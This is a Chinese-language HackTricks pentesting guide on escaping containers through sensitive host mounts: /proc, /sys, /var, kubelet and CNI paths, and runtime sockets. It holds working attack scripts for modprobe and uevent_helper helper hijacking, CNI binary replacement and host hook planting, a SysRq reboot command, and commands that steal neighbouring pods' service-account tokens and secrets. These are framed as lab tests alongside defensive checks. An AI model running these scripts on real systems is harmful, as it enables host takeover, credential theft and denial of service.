# 敏感主机挂载

{{#include ../../../banners/hacktricks-training.md}}

## 概述

主机挂载是最重要的实战容器逃逸攻击面之一，因为它们常常会让原本经过严格隔离的进程视图重新直接暴露主机资源。危险情况并不局限于 `/`。绑定挂载 `/proc`、`/sys`、`/var`、运行时套接字、由 kubelet 管理的状态目录或设备相关路径，都可能暴露内核控制接口、凭据、相邻容器的文件系统以及运行时管理接口。

本页面单独介绍这一主题，而不是将内容分散在各个防护页面中，因为其滥用模型涉及多个方面：部分与挂载命名空间有关，部分与用户命名空间有关，部分取决于 AppArmor 或 SELinux 的覆盖范围，还有部分取决于具体暴露了哪个主机路径。将其作为独立主题处理，可以更轻松地分析攻击面。

还要对比主机上可写目录与每个容器中对应的路径。如果该目录挂载到了一个存放可执行启动脚本的目录上，权限较低的主机用户就可能植入代码，供权限较高的容器 entrypoint 在下次重启时加载。请确认准确的绑定源和目标、目录的写入/搜索权限、entrypoint 循环及其对可执行文件的要求、运行时 UID，以及确实存在的重启触发条件。容器 UID 0 并不自动等同于主机 UID 0；主机侧的影响取决于用户命名空间映射和挂载策略。被动审查应报告路径和权限，不要写入脚本或重启工作负载。

Linux 容器可能运行在一台管理 VM 中，而该 VM 与单独的 Windows 主机共享部分文件系统。[VirtualBox shared folders](https://docs.oracle.com/en/virtualization/virtualbox/7.1/user/guestadditions.html) 是让主机文件在 guest 中可见的一种方式，但该 VM 中的 root 仍是区别于 Windows 管理员的身份。如果共享目录暴露了某个用户可读取的 SSH 私钥，应将其视为一条凭据线索：确认具体的主机挂载、密钥的所有权和访问权限、对应账户，以及 Windows SSH server 的**实际生效**授权密钥策略，然后再判断该密钥是否允许登录主机。现代 [Windows OpenSSH](https://learn.microsoft.com/en-us/windows-server/administration/openssh/openssh_keymanagement) 通常会为管理员账户使用单独的 `administrators_authorized_keys` 文件。常规枚举输出中不要包含私钥内容；被动初步排查只需记录挂载和密钥路径的元数据。

## `/proc` 暴露

procfs 同时包含普通进程信息和影响重大的内核控制接口。因此，像 `-v /proc:/host/proc` 这样的绑定挂载，或暴露意外可写 proc 条目的容器视图，都可能导致信息泄露、拒绝服务或直接在主机上执行代码。

procfs 中价值较高的路径包括：

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc/`（尤其是 `register` 和 `status`）
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### 滥用

首先检查哪些高价值 procfs 条目可见或可写：

```bash
for p in \
  /proc/sys/kernel/core_pattern \
  /proc/sys/kernel/modprobe \
  /proc/sys/fs/binfmt_misc/status \
  /proc/sys/fs/binfmt_misc/register \
  /proc/sysrq-trigger \
  /proc/kmsg \
  /proc/kallsyms \
  /proc/kcore \
  /proc/sched_debug \
  /proc/1/mountinfo \
  /proc/config.gz; do
  [ -e "$p" ] && ls -l "$p"
done
```

这些路径之所以值得关注，原因各不相同。`core_pattern`、`modprobe` 和 `binfmt_misc` 在可写时可能成为主机代码执行路径。`kallsyms`、`kmsg`、`kcore` 和 `config.gz` 是进行 kernel exploitation 时强大的侦察信息来源。`sched_debug` 和 `mountinfo` 会暴露进程、cgroup 和文件系统上下文，有助于从容器内部还原主机布局。

每个路径的实际价值各不相同。若将它们视为影响完全相同的路径，会让问题分级更困难：

- `/proc/sys/kernel/core_pattern`
  如果可写，这是影响最大的 procfs 路径之一，因为内核会在崩溃后执行管道处理程序。若容器能将 `core_pattern` 指向存储在其 overlay 或某个主机挂载路径中的 payload，通常就能获得主机代码执行。另请参阅 [read-only-paths.md](protections/read-only-paths.md)，其中有一个专门的示例。
- `/proc/sys/kernel/modprobe`
  该路径控制内核需要调用模块加载逻辑时使用的用户空间辅助程序。如果容器内可写，且其设置在主机上下文中生效，它也可能成为主机代码执行原语。若能找到触发该辅助程序的方式，这条路径尤其值得关注。
- `/proc/sys/vm/panic_on_oom`
  这通常不是直接的逃逸原语，但它可以将内存压力转化为影响整个主机的拒绝服务：把 OOM 状况转变为内核 panic 行为。
- `/proc/sys/fs/binfmt_misc`
  如果注册接口可写，攻击者可能为选定的 magic value 注册处理程序，并在执行匹配文件时获得主机上下文中的代码执行。
- `/proc/config.gz`
  对 kernel exploit 分级很有用。无需主机软件包元数据，就能借此判断启用了哪些子系统、缓解措施和可选内核功能。
- `/proc/sysrq-trigger`
  主要用于拒绝服务，但危害非常严重。它可以立即重启、触发 panic，或以其他方式干扰主机。
- `/proc/kmsg`
  会暴露内核环形缓冲区消息。可用于主机指纹识别、崩溃分析；在某些环境中，还能泄露有助于 kernel exploitation 的信息。
- `/proc/kallsyms`
  如果可读，它的价值很高，因为会暴露导出的内核符号信息，可能有助于在开发 kernel exploit 时绕过地址随机化假设。
- `/proc/[pid]/mem`
  这是直接访问进程内存的接口。如果满足必要的 ptrace 类条件并且能够访问目标进程，就可能读取或修改另一个进程的内存。实际影响很大程度上取决于凭据、`hidepid`、Yama 和 ptrace 限制，因此这是一条强大但有条件的路径。
- `/proc/kcore`
  会提供类似 core image 的系统内存视图。该文件体积巨大且不易使用，但如果它确实可读，就说明主机内存暴露面存在严重问题。
- `/dev/kmem` 和 `/dev/mem`
  历史上影响极大的原始内存**设备**接口，并非 procfs 文件。许多现代系统中，这些设备已不存在或受到严格限制；但如果容器能够打开主机挂载的副本，就应将此暴露视为严重问题。检查它们时，应与其他敏感 `/dev` 挂载一起审查，而不是搜索不存在的 `/proc/kmem` 或 `/proc/mem` 路径。
- `/proc/sched_debug`
  会泄露调度和任务信息，即使其他进程视图看起来比预期更干净，也可能暴露主机进程身份。
- `/proc/[pid]/mountinfo`
  对于还原容器在主机上的实际位置、确定哪些路径由 overlay 提供，以及判断可写挂载对应的是主机内容还是仅容器层，都非常有用。

如果 `/proc/[pid]/mountinfo` 或 overlay 详细信息可读，可利用它们还原容器文件系统在主机上的路径：

```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```

这些命令很有用，因为许多 host execution 技巧都需要将容器内的路径转换为从 host 角度对应的路径。

### 示例：准备 `modprobe` Helper 路径

如果容器内的 `/proc/sys/kernel/modprobe` 可写，且 helper 路径是在 host 上下文中解析的，就可以将其重定向到攻击者控制的 payload。overlay upper directory 必须能从 host 解析；如果容器没有同时挂载 host 的 `/tmp`，则 proof 输出必须写回同一个 host 可见的容器层：

```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_modprobe=$(cat /proc/sys/kernel/modprobe)
cat > /tmp/modprobe-payload <<EOF
#!/bin/sh
id > "$host_path/tmp/modprobe.out"
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
# Run only an authorized, lab-specific helper trigger here.
cat /tmp/modprobe.out
printf '%s\n' "$original_modprobe" > /proc/sys/kernel/modprobe
```

触发条件的确切情况取决于目标和内核行为，因此不会刻意猜测。离开实验环境前，请恢复原始值。关键在于，可写的 helper 路径可以将未来的内核 helper 调用重定向到攻击者控制的主机路径内容。缺少 overlay `upperdir`、主机无法解析该路径、只读的 sysctl 挂载，或内核从未调用所选 helper，都会中断这条链。

### 完整示例：使用 `kallsyms`、`kmsg` 和 `config.gz` 进行内核侦察

如果目标是评估可利用性，而不是立即逃逸：

```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```

这些命令有助于判断是否能看到有用的符号信息、近期内核消息是否暴露了有趣的状态，以及编译时启用了哪些内核功能或缓解措施。其影响通常不是直接逃逸，但能大幅缩短内核漏洞的排查时间。

### 完整示例：SysRq 主机重启

如果 `/proc/sysrq-trigger` 可写，且能访问到主机视图：

```bash
echo b > /proc/sysrq-trigger
```

其效果是立即重启主机。这不是一个隐蔽的例子，但它清楚地表明，暴露 procfs 可能带来远比信息泄露严重得多的后果。

## `/sys` 暴露

sysfs 暴露大量内核和设备状态。某些 sysfs 路径主要用于指纹识别，另一些则可能影响辅助程序执行、设备行为、安全模块配置或固件状态。

高价值的 sysfs 路径包括：

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

这些路径的重要性各不相同。`/sys/class/thermal` 可能影响热管理行为，因此在暴露不当的环境中会影响主机稳定性。`/sys/kernel/vmcoreinfo` 可能泄露崩溃转储和内核布局信息，有助于进行底层主机指纹识别。`/sys/kernel/security` 是 Linux Security Modules 使用的 `securityfs` 接口，因此对该路径的意外访问可能暴露或更改与 MAC 相关的状态。EFI 变量路径可能影响由固件存储的启动设置，因此其风险远高于普通配置文件。`/sys/kernel/debug` 下的 `debugfs` 尤其危险，因为它本就是面向开发者的接口，其安全预期远低于经过加固、面向生产环境的内核 API。

此列表中的每个 sysfs 条目都取决于**内核、配置和硬件**。当前的虚拟化节点通常完全不包含 `uevent_helper`、EFI 变量和热设备条目。将不存在的路径记录为未满足的前置条件，而不要假设其他内核中的示例也适用。

这些路径的实用检查命令如下：

```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```

这些命令值得关注的原因：

- `/sys/kernel/security` 可能会暴露 AppArmor、SELinux 或其他 LSM 接口，使其以本应仅限主机访问的方式可见。
- `/sys/kernel/debug` 通常是这一组中最令人担忧的发现。如果已挂载 `debugfs` 且可读或可写，就应预期存在广泛的内核交互面，其确切风险取决于启用的调试节点。
- EFI 变量暴露较少见，但影响很大，因为它涉及由固件支持的设置，而非普通运行时文件。
- `/sys/class/thermal` 主要与主机稳定性和硬件交互有关，而不是典型的 shell 式逃逸。
- `/sys/kernel/vmcoreinfo` 主要用于主机指纹识别和崩溃分析，有助于了解底层内核状态。

### 完整示例：`uevent_helper`

`/sys/kernel/uevent_helper` 取决于内核和配置，在许多当前系统中都不存在。如果它存在、可写，并且有可用的 `uevent` 触发机制，内核可能会执行攻击者控制的 helper。用于证明的输出必须使用主机和容器视图都可见的路径：

```bash
[ -w /sys/kernel/uevent_helper ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
[ -n "$host_path" ] || exit 1
original_helper=$(cat /sys/kernel/uevent_helper)
cat > /evil-helper <<EOF
#!/bin/sh
id > "$host_path/output"
EOF
chmod +x /evil-helper
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# This virtual-device path is a common lab trigger, but is not present everywhere.
uevent_file=/sys/class/mem/null/uevent
if [ ! -w "$uevent_file" ]; then
  printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
  echo "No writable, pre-approved uevent trigger was found" >&2
  exit 1
fi
echo change > "$uevent_file"
cat /output
printf '%s\n' "$original_helper" > /sys/kernel/uevent_helper
```

之所以可行，是因为 helper 路径是从主机的视角解析的。触发后，helper 会在主机上下文中运行，而不是在当前容器内运行。`/sys/class/mem/null/uevent` 是内核提供该文件时的一种具体触发方式；其他设备也可能提供自己的 `uevent` 文件，但不要在真实硬件上盲目选择。离开实验环境前，请恢复原始值。如果 helper 文件或可控触发器不存在，就不要声称此技术可用。

## `/var` 暴露

将主机的 `/var` 挂载到容器中常常被低估，因为它看起来不像挂载 `/` 那样引人注目。实际上，这可能足以访问运行时套接字、容器快照目录、由 kubelet 管理的 pod 卷、投射的 service-account token，以及相邻的应用程序文件系统。在现代节点上，`/var` 往往是容器运行状态中最值得关注的部分所在之处。

### Kubernetes 示例

带有 `hostPath: /var` 的 pod 通常可以读取其他 pod 投射的 token 和 overlay 快照内容：

```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```

这些命令有助于判断挂载暴露的只是普通应用数据，还是高影响力的集群凭据。可读取的 service-account token 可能会立即将本地代码执行转变为 Kubernetes API 访问权限。

如果 token 存在，应验证它能够访问哪些资源，而不是止步于发现 token：

```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```

此处的影响可能远不止访问本地节点。具有广泛 RBAC 权限的 token 可以将挂载的 `/var` 变成导致整个集群失陷的途径。

### Docker 和 containerd 示例

在 Docker 主机上，相关数据通常位于 `/var/lib/docker`；而在由 containerd 支持的 Kubernetes 节点上，数据可能位于 `/var/lib/containerd` 或特定 snapshotter 的路径下：

```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```

如果挂载的 `/var` 暴露了其他 workload 中可写的快照内容，攻击者可能无需触碰当前容器配置，就能篡改应用文件、植入 Web 内容或更改启动脚本。

在**一次性实验室 workload**上，可写的快照内容可用于演示应用篡改、secret 恢复或横向移动。先将 runtime container ID 映射到确切的快照，切勿编辑无关或生产环境中的快照：

```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f \( -path '*/.ssh/*' -o -path '*/authorized_keys' \) 2>/dev/null | head -n 20
```

这些命令很有用，因为它们展示了挂载 `/var` 的三种主要影响：篡改应用、恢复机密，以及横向移动到相邻工作负载。

直接写入快照会绕过 runtime 的常规状态管理，可能损坏容器或销毁证据。我们在本地针对 Docker `overlay2` 复现了只读发现：在相邻的临时容器中写入的标记出现在 `/var/lib/docker/overlay2/<id>/diff/` 下。实际修改快照仅限于为该测试创建的临时容器。

## Kubelet 状态、插件和 CNI 路径

挂载 `/var/lib/kubelet`、`/opt/cni/bin` 或 `/etc/cni/net.d` 通常通过特权 DaemonSet、CNI agent、CSI 节点插件、GPU operator 和存储辅助程序暴露出来。这些挂载很容易被当作“节点基础设施”而忽略，但它们直接处于新 pod 的执行路径上，而且通常包含 kubelet 凭据、投射的机密、注册 socket，以及主机侧的可执行插件二进制文件。

高价值目标包括：

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

实用的审查命令如下：

```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
  egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```

为什么这些路径很重要：

- `/var/lib/kubelet/pki` 可能会暴露 kubelet 客户端证书和其他节点本地凭据；根据集群设计，这些凭据有时可用于访问 API server 或面向 kubelet 的 TLS 端点。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/pods` 通常包含同一节点上相邻 pod 的投射式 service-account token 和挂载的 Secrets。
- `/var/lib/kubelet/pod-resources/kubelet.sock` 主要是一个侦察入口，但非常有用：它会显示当前由哪些 pod 和容器占用 GPU、大页内存、SR-IOV 设备及其他稀缺的节点本地资源。<sup>[[1]](#references)</sup>
- `/var/lib/kubelet/device-plugins`、`/var/lib/kubelet/plugins` 和 `/var/lib/kubelet/plugins_registry` 会显示已安装哪些 CSI、DRA 和设备插件，以及 kubelet 预期会与哪些 socket 通信。如果这些目录可写而不只是可读，问题就严重得多。<sup>[[1]](#references)</sup>
- `/opt/cni/bin` 和 `/etc/cni/net.d` 直接处于 pod 网络配置流程中。对这些路径的可写访问往往会成为延迟触发的主机代码执行手段，而不只是配置泄露。<sup>[[2]](#references)</sup>

### 完整示例：可写的 `/opt/cni/bin`

如果主机 CNI 二进制文件目录以读写方式挂载，替换一个插件就可能足以在 kubelet 下次于该节点创建 pod sandbox 时获得主机代码执行：<sup>[[2]](#references)</sup>

```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
  grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > "$(dirname "$0")/.cni-triggered"
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
cat "$(dirname "$plugin")/.cni-triggered"
mv "${plugin}.orig" "$plugin"
rm -f "$(dirname "$plugin")/.cni-triggered"
```

这不像挂载 `docker.sock` 那样能立即生效，但在遭到入侵的 Kubernetes 基础设施 Pod 中，这种情况往往更为常见。标记文件会写在挂载的插件旁边，这样容器即使没有挂载 host-root 或 host-`/tmp`，也能取回它。包装器会保留原始参数和标准输入，然后示例会还原原始二进制文件。关键在于，修改后的二进制文件之后会由主机网络设置流程执行，而不是由当前容器执行。请仅在一次性节点上使用，因为无效的包装器可能导致新的 Pod 沙箱无法获得网络连接。

## 运行时套接字

敏感的主机挂载通常包含运行时套接字，而不是完整目录。这些套接字非常重要，因此值得在此特别重申：

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```

请参阅 [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md)，了解挂载其中一个 socket 后的完整利用流程。

快速进行首次交互时，可以采用以下模式：

```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```

如果其中一种方式成功，从“已挂载的 socket”到“启动一个权限更高的 sibling container”的路径，通常比任何 kernel breakout 路径都短得多。

相同的 daemon 访问权限也可以用于建立 **host persistence**。一个具有可写 host-root bind mount 的 helper container 可以通过 `docker cp` 接收文件，然后使用 `docker exec` 将 SSH key、service unit 或其他 persistence 文件放到已挂载的 host 路径下。安全边界在于 daemon 创建 host mount 的权限；`docker cp` 只是暂存步骤。在 runtime socket 暴露后，应审计新创建的 containers，以及对 host authentication 或 startup 路径的写入。

## Writable Host Path Task Hijack

可写 host mount 不必暴露 `/` 才会造成危险。如果挂载路径中包含脚本、配置文件、hooks、plugins，或之后会被 host-side scheduled task 或 service 使用的文件，那么 container 可能能够修改 host 执行的内容。

通用审查流程：

```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```

如果宿主进程会读取一个可写文件，在测试时应让 payload 保持简单且易于观察：

```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```

有意思的部分在于信任边界：写入操作发生在容器内部，但执行操作稍后会在 host 服务上下文中发生。这会让范围有限的 hostPath 或 bind mount 成为延迟触发 host 代码执行的原语。

## 共享 Host 路径上的 Root 所有文件

能够变为 root 的容器账户，可能可以在 host 也使用的可写路径上放置一个 root 所有的文件。如果容器 UID 0 映射到 host UID 0，那么两边看到的是同一个文件；并且如果 host mount 允许 SUID 执行，那么能够在该路径上运行 root 所有 SUID 可执行文件的 host 用户就可能跨越 host 权限边界。针对这个文件所有权问题，容器不必以 `--privileged` 运行。另见 [user namespace mappings](protections/namespaces/user-namespace.md) 和 [SUID 讨论](privileged-containers.md)，了解其他独立条件。

从**两侧**检查路径：比较一个无害文件的所有权和身份，检查容器的 `uid_map` 和 `gid_map`，并查看 host 的 mount 选项和执行策略。容器侧的 `rw` 且没有 `nosuid`，只能说明它值得进一步检查；这无法证明 host 所有权、host mount 标志、host 用户的访问权限，或 AppArmor/SELinux 是否会阻止执行。`noexec` 会限制其适用视图中的执行。`/proc/self/mountinfo` 中的 `shared:` 和 `master:` 标签描述的是 mount 传播，而不是文件内容是否与 host 共享。bind mount 可能没有这些标签。提供 host 登录的凭据复用，与共享文件权限边界是两个不同步骤。

即使没有显式 bind mount，host 的 runtime 存储也可能形成类似路径。[CVE-2021-41091](https://github.com/moby/moby/security/advisories/GHSA-3fwx-pjgw-3558) 允许无特权 host 用户遍历 Docker 数据子目录，并从容器文件系统执行文件；Moby 在 20.10.9 中修复了权限问题，并指出必须重启正在运行的容器才能修正其目录。检查确切的 `overlay2/<id>/merged` 挂载路径及每个父目录的搜索权限，然后确认容器 UID 0 是否映射到 host UID 0、是否存在可访问的真实 root 所有 SetUID 可执行文件，以及 host 视图是否允许 SetUID 执行。Rootless 或 user-namespace-remapped 容器、`nosuid`、`noexec`、`no_new_privs` 和 MAC 策略都可能改变结果。仅凭 runtime 版本或可遍历路径只能作为审查线索，不能证明可以在 host 上以 root 执行；检查 mount 和文件元数据时，不要运行候选可执行文件。

## 与 Mount 相关的 CVE

Host mount 也会涉及 runtime 漏洞。近期重要示例包括：

- `runc` 中的 `CVE-2024-21626`：泄露的目录文件描述符可能使工作目录落在 host 文件系统上。
- BuildKit 中的 `CVE-2024-23651`、`CVE-2024-23652` 和 `CVE-2024-23653`：恶意 Dockerfile、frontend 和 `RUN --mount` 流程可能在构建期间重新引入 host 文件访问、删除或权限提升。
- Buildah 和 Podman 构建流程中的 `CVE-2024-1753`：构建期间构造的 bind mount 可能暴露可读写的 `/`。
- `containerd` 2.1.0 中的 `CVE-2025-47290`：镜像解包期间的 TOCTOU 可能使特制镜像在 pull 期间修改 host 文件系统。

这些 CVE 与此处相关，因为它们表明 mount 处理不只是操作员配置的问题。runtime 本身也可能引入由 mount 驱动的逃逸条件。

## 检查

使用以下命令快速定位风险最高的 mount 暴露：

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

这里有哪些值得关注的内容：

- Host root、`/proc`、`/sys`、`/var` 和运行时套接字都是优先级很高的发现。
- 可写的 proc/sys 条目通常意味着挂载暴露的是主机全局内核控制项，而不是安全的容器视图。
- 对挂载的 `/var` 路径，除了检查文件系统，还应审查其中的凭据和相邻工作负载。
- Kubelet 状态目录和 CNI/插件路径应与运行时套接字同等优先，因为它们通常直接处于节点的 pod 创建和凭据分发路径上。

## 本地验证状态

本页中的实际利用链已在本地 Linux minikube 节点上验证。验证复现了以下情况：

- 通过临时的可写 hostPath 进行读写
- 通过 `/var/lib/kubelet/pods` 发现投射的 ServiceAccount token 和挂载的 Secrets
- 使用从挂载的 kubelet 状态中恢复的有效 token 成功通过 Kubernetes API 身份验证
- 通过挂载的 `/var` 只读发现相邻 Docker `overlay2` 文件系统
- 通过挂载的 `docker.sock`，使用 Docker API 创建带只读主机绑定挂载的同级容器
- 通过临时的主机消费型 hook 延迟执行主机上的操作
- 模拟 CNI wrapper，并保留原始插件的参数、标准输入和执行过程

同一节点还暴露了 `core_pattern`、`modprobe`、`binfmt_misc/register`、`kallsyms`、`kcore` 和 `config.gz`，但未暴露 `uevent_helper`、EFI 变量、thermal 条目或 `sched_debug`。未执行具有破坏性的内核触发操作。这证实了 host-root、`/var`、kubelet 状态、套接字和主机消费者利用链均可复现；而 procfs/sysfs helper 技术则必须根据具体内核、挂载模式、payload 路径和触发条件来判断是否适用。

## References

- [1] [Kubelet 使用的本地文件和路径](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [cilium-agent 容器可通过 `hostPath` 挂载访问主机](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
